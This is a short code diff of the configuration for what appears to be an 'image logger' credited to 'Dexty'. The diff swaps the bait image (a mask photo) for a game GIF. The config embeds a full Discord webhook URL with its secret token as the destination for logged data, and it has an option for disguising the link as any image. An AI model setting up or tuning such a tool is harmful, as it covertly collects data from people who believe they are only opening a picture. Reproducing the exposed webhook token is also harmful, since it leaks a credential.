@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1418975868579217598/kiMtwEbZe3GLA76IQMVUkyAlE34BQH2Jm5cwx-8ir_xMqHEetvxBsMIRbyMvrO28mMtk",
-    "image": "https://images.halloweencostumes.eu/products/76479/1-1/adult-tokyo-ghoul-ken-kaneki-mask.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://media.tenor.com/ovI8CGiaWDsAAAAM/get-on-dbd-get-on-dead-by-daylight.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
